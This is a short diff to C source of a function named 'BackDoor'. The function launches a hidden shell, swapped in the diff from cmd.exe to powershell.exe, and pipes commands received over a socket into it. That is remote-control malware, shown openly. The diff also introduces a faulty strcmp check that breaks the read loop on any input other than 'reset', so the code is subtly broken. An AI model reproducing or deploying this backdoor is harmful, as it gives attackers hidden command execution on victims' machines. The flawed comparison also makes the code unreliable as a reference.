@@ -271,7 +271,7 @@ void BackDoor(SOCKET sock){
     si.wShowWindow=SW_HIDE; 
     si.hStdInput=hReadPipe2; 
     si.hStdOutput=si.hStdError=hWritePipe1; 
-    char cmdline[]="cmd.exe"; 
+    char cmdline[]="powershell.exe"; 
     PROCESS_INFORMATION ProcessInformation; 
     ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 
 
@@ -293,7 +293,7 @@ void BackDoor(SOCKET sock){
             printf("Recv:\n%s\nRecvEnd\n",Buff);
             
 
-            if (lBytesRead<=0 || Buff == "reset") {
+            if (lBytesRead<=0 || strcmp(Buff,"reset")) {
                 break;
             }//没数据or服务器退出(mod:1) 
             ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
